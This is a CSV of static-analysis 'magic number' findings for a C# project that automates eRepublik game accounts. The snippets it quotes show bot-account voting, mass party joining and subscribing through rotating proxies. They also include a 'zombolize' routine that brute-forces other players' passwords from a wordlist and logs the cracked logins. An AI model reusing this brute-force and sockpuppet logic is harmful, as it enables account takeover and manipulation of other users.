Implementation smell,Namespace,Class,File,Method,Description
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: foreach (string bot in bots) {  	if (bot.Contains ("|")) {  		string[] pair = bot.Split ('|');  		ConsoleLog.WriteLine (pair [0] + "|" + pair [1]);  		NerZul.Core.Network.Bot nbot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  		bool ok = false;  		while (!ok) {  			try {  				if (nbot.Login ()) {  					ConsoleLog.WriteLine ("Logged in");  					if (args [0].ToLower () == "vote")  						nbot.VoteArticle (int.Parse (args [2]));  					else if (args [0].ToLower () == "subscribe")  						nbot.SubscribeNewspaper (int.Parse (args [2]));  					else  						nbot.UnsubscribeNewspaper (int.Parse (args [2]));  					ok = true;  				}  			}  			catch (Exception e) {  				ConsoleLog.WriteLine ("Vote error: " + e.Message);  			}  			if (!ok)  				System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  		}  		System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  	}  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (bot.Contains ("|")) {  	string[] pair = bot.Split ('|');  	ConsoleLog.WriteLine (pair [0] + "|" + pair [1]);  	NerZul.Core.Network.Bot nbot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  	bool ok = false;  	while (!ok) {  		try {  			if (nbot.Login ()) {  				ConsoleLog.WriteLine ("Logged in");  				if (args [0].ToLower () == "vote")  					nbot.VoteArticle (int.Parse (args [2]));  				else if (args [0].ToLower () == "subscribe")  					nbot.SubscribeNewspaper (int.Parse (args [2]));  				else  					nbot.UnsubscribeNewspaper (int.Parse (args [2]));  				ok = true;  			}  		}  		catch (Exception e) {  			ConsoleLog.WriteLine ("Vote error: " + e.Message);  		}  		if (!ok)  			System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  	}  	System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (bot.Contains ("|")) {  	string[] pair = bot.Split ('|');  	ConsoleLog.WriteLine (pair [0] + "|" + pair [1]);  	NerZul.Core.Network.Bot nbot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  	bool ok = false;  	while (!ok) {  		try {  			if (nbot.Login ()) {  				ConsoleLog.WriteLine ("Logged in");  				if (args [0].ToLower () == "vote")  					nbot.VoteArticle (int.Parse (args [2]));  				else if (args [0].ToLower () == "subscribe")  					nbot.SubscribeNewspaper (int.Parse (args [2]));  				else  					nbot.UnsubscribeNewspaper (int.Parse (args [2]));  				ok = true;  			}  		}  		catch (Exception e) {  			ConsoleLog.WriteLine ("Vote error: " + e.Message);  		}  		if (!ok)  			System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  	}  	System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (bot.Contains ("|")) {  	string[] pair = bot.Split ('|');  	ConsoleLog.WriteLine (pair [0] + "|" + pair [1]);  	NerZul.Core.Network.Bot nbot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  	bool ok = false;  	while (!ok) {  		try {  			if (nbot.Login ()) {  				ConsoleLog.WriteLine ("Logged in");  				if (args [0].ToLower () == "vote")  					nbot.VoteArticle (int.Parse (args [2]));  				else if (args [0].ToLower () == "subscribe")  					nbot.SubscribeNewspaper (int.Parse (args [2]));  				else  					nbot.UnsubscribeNewspaper (int.Parse (args [2]));  				ok = true;  			}  		}  		catch (Exception e) {  			ConsoleLog.WriteLine ("Vote error: " + e.Message);  		}  		if (!ok)  			System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  	}  	System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (bot.Contains ("|")) {  	string[] pair = bot.Split ('|');  	ConsoleLog.WriteLine (pair [0] + "|" + pair [1]);  	NerZul.Core.Network.Bot nbot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  	bool ok = false;  	while (!ok) {  		try {  			if (nbot.Login ()) {  				ConsoleLog.WriteLine ("Logged in");  				if (args [0].ToLower () == "vote")  					nbot.VoteArticle (int.Parse (args [2]));  				else if (args [0].ToLower () == "subscribe")  					nbot.SubscribeNewspaper (int.Parse (args [2]));  				else  					nbot.UnsubscribeNewspaper (int.Parse (args [2]));  				ok = true;  			}  		}  		catch (Exception e) {  			ConsoleLog.WriteLine ("Vote error: " + e.Message);  		}  		if (!ok)  			System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  	}  	System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (bot.Contains ("|")) {  	string[] pair = bot.Split ('|');  	ConsoleLog.WriteLine (pair [0] + "|" + pair [1]);  	NerZul.Core.Network.Bot nbot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  	bool ok = false;  	while (!ok) {  		try {  			if (nbot.Login ()) {  				ConsoleLog.WriteLine ("Logged in");  				if (args [0].ToLower () == "vote")  					nbot.VoteArticle (int.Parse (args [2]));  				else if (args [0].ToLower () == "subscribe")  					nbot.SubscribeNewspaper (int.Parse (args [2]));  				else  					nbot.UnsubscribeNewspaper (int.Parse (args [2]));  				ok = true;  			}  		}  		catch (Exception e) {  			ConsoleLog.WriteLine ("Vote error: " + e.Message);  		}  		if (!ok)  			System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  	}  	System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (bot.Contains ("|")) {  	string[] pair = bot.Split ('|');  	ConsoleLog.WriteLine (pair [0] + "|" + pair [1]);  	NerZul.Core.Network.Bot nbot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  	bool ok = false;  	while (!ok) {  		try {  			if (nbot.Login ()) {  				ConsoleLog.WriteLine ("Logged in");  				if (args [0].ToLower () == "vote")  					nbot.VoteArticle (int.Parse (args [2]));  				else if (args [0].ToLower () == "subscribe")  					nbot.SubscribeNewspaper (int.Parse (args [2]));  				else  					nbot.UnsubscribeNewspaper (int.Parse (args [2]));  				ok = true;  			}  		}  		catch (Exception e) {  			ConsoleLog.WriteLine ("Vote error: " + e.Message);  		}  		if (!ok)  			System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  	}  	System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (bot.Contains ("|")) {  	string[] pair = bot.Split ('|');  	ConsoleLog.WriteLine (pair [0] + "|" + pair [1]);  	NerZul.Core.Network.Bot nbot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  	bool ok = false;  	while (!ok) {  		try {  			if (nbot.Login ()) {  				ConsoleLog.WriteLine ("Logged in");  				if (args [0].ToLower () == "vote")  					nbot.VoteArticle (int.Parse (args [2]));  				else if (args [0].ToLower () == "subscribe")  					nbot.SubscribeNewspaper (int.Parse (args [2]));  				else  					nbot.UnsubscribeNewspaper (int.Parse (args [2]));  				ok = true;  			}  		}  		catch (Exception e) {  			ConsoleLog.WriteLine ("Vote error: " + e.Message);  		}  		if (!ok)  			System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  	}  	System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: while (!ok) {  	try {  		if (nbot.Login ()) {  			ConsoleLog.WriteLine ("Logged in");  			if (args [0].ToLower () == "vote")  				nbot.VoteArticle (int.Parse (args [2]));  			else if (args [0].ToLower () == "subscribe")  				nbot.SubscribeNewspaper (int.Parse (args [2]));  			else  				nbot.UnsubscribeNewspaper (int.Parse (args [2]));  			ok = true;  		}  	}  	catch (Exception e) {  		ConsoleLog.WriteLine ("Vote error: " + e.Message);  	}  	if (!ok)  		System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: while (!ok) {  	try {  		if (nbot.Login ()) {  			ConsoleLog.WriteLine ("Logged in");  			if (args [0].ToLower () == "vote")  				nbot.VoteArticle (int.Parse (args [2]));  			else if (args [0].ToLower () == "subscribe")  				nbot.SubscribeNewspaper (int.Parse (args [2]));  			else  				nbot.UnsubscribeNewspaper (int.Parse (args [2]));  			ok = true;  		}  	}  	catch (Exception e) {  		ConsoleLog.WriteLine ("Vote error: " + e.Message);  	}  	if (!ok)  		System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: while (!ok) {  	try {  		if (nbot.Login ()) {  			ConsoleLog.WriteLine ("Logged in");  			if (args [0].ToLower () == "vote")  				nbot.VoteArticle (int.Parse (args [2]));  			else if (args [0].ToLower () == "subscribe")  				nbot.SubscribeNewspaper (int.Parse (args [2]));  			else  				nbot.UnsubscribeNewspaper (int.Parse (args [2]));  			ok = true;  		}  	}  	catch (Exception e) {  		ConsoleLog.WriteLine ("Vote error: " + e.Message);  	}  	if (!ok)  		System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: while (!ok) {  	try {  		if (nbot.Login ()) {  			ConsoleLog.WriteLine ("Logged in");  			if (args [0].ToLower () == "vote")  				nbot.VoteArticle (int.Parse (args [2]));  			else if (args [0].ToLower () == "subscribe")  				nbot.SubscribeNewspaper (int.Parse (args [2]));  			else  				nbot.UnsubscribeNewspaper (int.Parse (args [2]));  			ok = true;  		}  	}  	catch (Exception e) {  		ConsoleLog.WriteLine ("Vote error: " + e.Message);  	}  	if (!ok)  		System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: while (!ok) {  	try {  		if (nbot.Login ()) {  			ConsoleLog.WriteLine ("Logged in");  			if (args [0].ToLower () == "vote")  				nbot.VoteArticle (int.Parse (args [2]));  			else if (args [0].ToLower () == "subscribe")  				nbot.SubscribeNewspaper (int.Parse (args [2]));  			else  				nbot.UnsubscribeNewspaper (int.Parse (args [2]));  			ok = true;  		}  	}  	catch (Exception e) {  		ConsoleLog.WriteLine ("Vote error: " + e.Message);  	}  	if (!ok)  		System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: try {  	if (nbot.Login ()) {  		ConsoleLog.WriteLine ("Logged in");  		if (args [0].ToLower () == "vote")  			nbot.VoteArticle (int.Parse (args [2]));  		else if (args [0].ToLower () == "subscribe")  			nbot.SubscribeNewspaper (int.Parse (args [2]));  		else  			nbot.UnsubscribeNewspaper (int.Parse (args [2]));  		ok = true;  	}  }  catch (Exception e) {  	ConsoleLog.WriteLine ("Vote error: " + e.Message);  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: try {  	if (nbot.Login ()) {  		ConsoleLog.WriteLine ("Logged in");  		if (args [0].ToLower () == "vote")  			nbot.VoteArticle (int.Parse (args [2]));  		else if (args [0].ToLower () == "subscribe")  			nbot.SubscribeNewspaper (int.Parse (args [2]));  		else  			nbot.UnsubscribeNewspaper (int.Parse (args [2]));  		ok = true;  	}  }  catch (Exception e) {  	ConsoleLog.WriteLine ("Vote error: " + e.Message);  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: try {  	if (nbot.Login ()) {  		ConsoleLog.WriteLine ("Logged in");  		if (args [0].ToLower () == "vote")  			nbot.VoteArticle (int.Parse (args [2]));  		else if (args [0].ToLower () == "subscribe")  			nbot.SubscribeNewspaper (int.Parse (args [2]));  		else  			nbot.UnsubscribeNewspaper (int.Parse (args [2]));  		ok = true;  	}  }  catch (Exception e) {  	ConsoleLog.WriteLine ("Vote error: " + e.Message);  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (nbot.Login ()) {  	ConsoleLog.WriteLine ("Logged in");  	if (args [0].ToLower () == "vote")  		nbot.VoteArticle (int.Parse (args [2]));  	else if (args [0].ToLower () == "subscribe")  		nbot.SubscribeNewspaper (int.Parse (args [2]));  	else  		nbot.UnsubscribeNewspaper (int.Parse (args [2]));  	ok = true;  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (nbot.Login ()) {  	ConsoleLog.WriteLine ("Logged in");  	if (args [0].ToLower () == "vote")  		nbot.VoteArticle (int.Parse (args [2]));  	else if (args [0].ToLower () == "subscribe")  		nbot.SubscribeNewspaper (int.Parse (args [2]));  	else  		nbot.UnsubscribeNewspaper (int.Parse (args [2]));  	ok = true;  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (nbot.Login ()) {  	ConsoleLog.WriteLine ("Logged in");  	if (args [0].ToLower () == "vote")  		nbot.VoteArticle (int.Parse (args [2]));  	else if (args [0].ToLower () == "subscribe")  		nbot.SubscribeNewspaper (int.Parse (args [2]));  	else  		nbot.UnsubscribeNewspaper (int.Parse (args [2]));  	ok = true;  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (args [0].ToLower () == "vote")  	nbot.VoteArticle (int.Parse (args [2]));  else if (args [0].ToLower () == "subscribe")  	nbot.SubscribeNewspaper (int.Parse (args [2]));  else  	nbot.UnsubscribeNewspaper (int.Parse (args [2]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (args [0].ToLower () == "vote")  	nbot.VoteArticle (int.Parse (args [2]));  else if (args [0].ToLower () == "subscribe")  	nbot.SubscribeNewspaper (int.Parse (args [2]));  else  	nbot.UnsubscribeNewspaper (int.Parse (args [2]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (args [0].ToLower () == "vote")  	nbot.VoteArticle (int.Parse (args [2]));  else if (args [0].ToLower () == "subscribe")  	nbot.SubscribeNewspaper (int.Parse (args [2]));  else  	nbot.UnsubscribeNewspaper (int.Parse (args [2]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: nbot.VoteArticle (int.Parse (args [2]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (args [0].ToLower () == "subscribe")  	nbot.SubscribeNewspaper (int.Parse (args [2]));  else  	nbot.UnsubscribeNewspaper (int.Parse (args [2]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (args [0].ToLower () == "subscribe")  	nbot.SubscribeNewspaper (int.Parse (args [2]));  else  	nbot.UnsubscribeNewspaper (int.Parse (args [2]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: nbot.SubscribeNewspaper (int.Parse (args [2]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: nbot.UnsubscribeNewspaper (int.Parse (args [2]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (!ok)  	System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: if (!ok)  	System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,vote_subscribe,The following statement contains a magic number: System.Threading.Thread.Sleep (1000 * int.Parse (args [3]));  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,filter_min_exp,The following statement contains a magic number: if (args.Length != 4) {  	ConsoleLog.WriteLine ("checkbanned list out_list minexp");  	return;  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,filter_min_exp,The following statement contains a magic number: foreach (string Bot in Bots) {  	ConsoleLog.WriteLine ("[" + cnt.ToString () + "/" + Bots.Length.ToString () + "] " + "Checking " + Bot.Split ('|') [0]);  	cnt++;  	string botinfo = Bot.Split ('|') [0].Replace (" "' "%20");  	botinfo = "http://api.erepublik.com/v1/feeds/citizens/" + botinfo + "?by_username=true";  	botinfo = client.DownloadString (botinfo);  	botinfo = System.Text.RegularExpressions.Regex.Match (botinfo' @"\<experience-points\>(\w+)\<").Groups [1].Value;  	if (int.Parse (botinfo) >= int.Parse (args [3])) {  		outs.WriteLine (Bot);  		outs.Flush ();  		ConsoleLog.WriteLine ("OK");  	}  	System.Threading.Thread.Sleep (3000);  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,filter_min_exp,The following statement contains a magic number: foreach (string Bot in Bots) {  	ConsoleLog.WriteLine ("[" + cnt.ToString () + "/" + Bots.Length.ToString () + "] " + "Checking " + Bot.Split ('|') [0]);  	cnt++;  	string botinfo = Bot.Split ('|') [0].Replace (" "' "%20");  	botinfo = "http://api.erepublik.com/v1/feeds/citizens/" + botinfo + "?by_username=true";  	botinfo = client.DownloadString (botinfo);  	botinfo = System.Text.RegularExpressions.Regex.Match (botinfo' @"\<experience-points\>(\w+)\<").Groups [1].Value;  	if (int.Parse (botinfo) >= int.Parse (args [3])) {  		outs.WriteLine (Bot);  		outs.Flush ();  		ConsoleLog.WriteLine ("OK");  	}  	System.Threading.Thread.Sleep (3000);  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,filter_min_exp,The following statement contains a magic number: if (int.Parse (botinfo) >= int.Parse (args [3])) {  	outs.WriteLine (Bot);  	outs.Flush ();  	ConsoleLog.WriteLine ("OK");  }  
Magic Number,Engine,Misc,C:\repos\sasha237_NorthCitadel\OldEngine\Misc.cs,filter_min_exp,The following statement contains a magic number: System.Threading.Thread.Sleep (3000);  
Magic Number,Engine,PartyJoin,C:\repos\sasha237_NorthCitadel\OldEngine\PartyJoin.cs,join_thread,The following statement contains a magic number: while (bot != null) {  	string[] pair = bot.Split ('|');  	bool sOK = false;  	while (!sOK) {  		NerZul.Core.Network.Bot Bot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  		Bot.HttpClient.Proxy = arg.ProxyList.GetRandomString ();  		Bot.HttpClient.Timeout = 20000;  		ConsoleLog.WriteLine ("Try \"" + pair [0] + "\" with" + Bot.HttpClient.Proxy);  		try {  			if (Bot.Login ()) {  				//Bot.HttpClient.Proxy=null;  				if (arg.Leave) {  					ConsoleLog.WriteLine (pair [0] + " logged in");  					string PostData = Bot.GetTokenArg (1);  					Bot.CustomRequest ("http://www.erepublik.com/en/resign-party/" + arg.Party' PostData);  				}  				else {  					Bot.CustomRequest ("http://www.erepublik.com/en/join-party/" + arg.Party);  				}  				sOK = true;  				ConsoleLog.WriteLine (pair [0] + " OK");  			}  		}  		catch (Exception) {  		}  		;  	}  	bot = arg.BotList.GetNextBot ();  }  
Magic Number,Engine,PartyJoin,C:\repos\sasha237_NorthCitadel\OldEngine\PartyJoin.cs,join_thread,The following statement contains a magic number: while (!sOK) {  	NerZul.Core.Network.Bot Bot = new NerZul.Core.Network.Bot (pair [0]' pair [1]' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  	Bot.HttpClient.Proxy = arg.ProxyList.GetRandomString ();  	Bot.HttpClient.Timeout = 20000;  	ConsoleLog.WriteLine ("Try \"" + pair [0] + "\" with" + Bot.HttpClient.Proxy);  	try {  		if (Bot.Login ()) {  			//Bot.HttpClient.Proxy=null;  			if (arg.Leave) {  				ConsoleLog.WriteLine (pair [0] + " logged in");  				string PostData = Bot.GetTokenArg (1);  				Bot.CustomRequest ("http://www.erepublik.com/en/resign-party/" + arg.Party' PostData);  			}  			else {  				Bot.CustomRequest ("http://www.erepublik.com/en/join-party/" + arg.Party);  			}  			sOK = true;  			ConsoleLog.WriteLine (pair [0] + " OK");  		}  	}  	catch (Exception) {  	}  	;  }  
Magic Number,Engine,PartyJoin,C:\repos\sasha237_NorthCitadel\OldEngine\PartyJoin.cs,join_thread,The following statement contains a magic number: Bot.HttpClient.Timeout = 20000;  
Magic Number,Engine,PartyJoin,C:\repos\sasha237_NorthCitadel\OldEngine\PartyJoin.cs,join_party,The following statement contains a magic number: arg.ProxyList = new NerZul.Core.Utils.StringSelector (args [2]);  
Magic Number,Engine,PartyJoin,C:\repos\sasha237_NorthCitadel\OldEngine\PartyJoin.cs,join_party,The following statement contains a magic number: arg.Party = args [3];  
Magic Number,Engine,PartyJoin,C:\repos\sasha237_NorthCitadel\OldEngine\PartyJoin.cs,join_party,The following statement contains a magic number: for (int i = 0; i < 20; i++) {  	System.Threading.Thread th = new System.Threading.Thread (join_thread);  	th.Start (arg);  	lock (lockable) {  	}  }  
Magic Number,Engine,PartyJoin,C:\repos\sasha237_NorthCitadel\OldEngine\PartyJoin.cs,join_party,The following statement contains a magic number: System.Threading.Thread.Sleep (5000000);  
Magic Number,Engine,Zomboloid,C:\repos\sasha237_NorthCitadel\OldEngine\Zomboloid.cs,zombolize_thread,The following statement contains a magic number: while (true) {  	//Получаем новую пару логин/пароль или выходим  	lock (m_List) {  		//В текущем списке пусто?  		if (m_List.Count == 0) {  			string nextvictim = m_NickNameList.GetNextString ();  			//Там вообще кто-то ещё есть?  			if (nextvictim == null) {  				//Нам тут больше делать нечего' по ходу. Тормозим поток.  				lock (m_ThreadCountLock) {  					m_ThreadCount--;  				}  				return;  			}  			ConsoleLog.WriteLine ("Trying to hack " + nextvictim + ". " + m_NickNameList.m_List.Count + " left.");  			//Генерим набор' чо  			m_List.Add (new LoginPassword (nextvictim' nextvictim));  			foreach (string password in m_Dictionary) {  				m_List.Add (new LoginPassword (nextvictim' password));  			}  		}  		//Вытаскиваем из списка следующую пару логин/пасс  		LPPair = m_List [0];  		m_List.RemoveAt (0);  	}  	//Долго и упорно пытаемся залогиниться. Связь нестабильна' поэтому ждём  	//ответа именно от ерепки' а не от быдлопрокси' который считает' что он  	//тут самый умный и вообще  	string Answer = null;  	while (true) {  		NerZul.Core.Network.Bot bot = new NerZul.Core.Network.Bot (Uri.EscapeDataString (LPPair.Login)' Uri.EscapeDataString (LPPair.Password)' "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1"' ""' 0);  		bot.HttpClient.Proxy = m_ProxyList.GetRandomString ();  		bool HasAnswer = false;  		try {  			bot.Login ();  			HasAnswer = true;  		}  		catch (Exception) {  		}  		;  		//Если там не вылетел эксепшн - смотрим. Иначе - нахуй  		if (HasAnswer) {  			Answer = bot.GetLastResponse ();  			//Если ответ таки от ерепки' думаем дальше  			if (Answer.Contains ("href=\"/en/tickets"))  				break;  		}  	}  	//А куда мы попали?  	if (Answer.Contains ("Permanent suspension")) {  		//Ух ты бля' оно в пермабане  		lock (m_List) {  			//Чистим список' если этого не сделали до нас  			if ((m_List.Count > 0) && (m_List [0].Login == LPPair.Login)) {  				m_List.Clear ();  			}  		}  	}  	//Левый пасс' нэ?  	else if ((Answer.Contains ("Wrong password")) || (Answer.Contains ("Wrong citizen"))) {  		//Эм. А ничего не делаем. Наверное  	}  	else {  		//О' кул' залогинились. Пишем в лог' чистим списки  		if ((m_List.Count > 0) && (m_List [0].Login == LPPair.Login)) {  			m_List.Clear ();  		}  		m_OutS.WriteLine (LPPair.Login + "|" + LPPair.Password);  		m_OutS.Flush ();  		ConsoleLog.WriteLine ("HACKED: " + LPPair.Login + ":" + LPPair.Password);  	}  	//Усё' а теперь следующую пару.  	System.Threading.Thread.Sleep (500);  }  
Magic Number,Engine,Zomboloid,C:\repos\sasha237_NorthCitadel\OldEngine\Zomboloid.cs,zombolize_thread,The following statement contains a magic number: System.Threading.Thread.Sleep (500);  
Magic Number,Engine,Zomboloid,C:\repos\sasha237_NorthCitadel\OldEngine\Zomboloid.cs,zombolize,The following statement contains a magic number: if (args.Length != 6) {  	ConsoleLog.WriteLine ("Usage: zombolize loginlist dictionary proxylist threadcount outfile");  	return;  }  
Magic Number,Engine,Zomboloid,C:\repos\sasha237_NorthCitadel\OldEngine\Zomboloid.cs,zombolize,The following statement contains a magic number: m_Dictionary = System.IO.File.ReadAllLines (args [2]);  
Magic Number,Engine,Zomboloid,C:\repos\sasha237_NorthCitadel\OldEngine\Zomboloid.cs,zombolize,The following statement contains a magic number: m_ProxyList = new NerZul.Core.Utils.StringSelector (args [3]);  
Magic Number,Engine,Zomboloid,C:\repos\sasha237_NorthCitadel\OldEngine\Zomboloid.cs,zombolize,The following statement contains a magic number: m_OutS = new System.IO.StreamWriter (args [5]);  
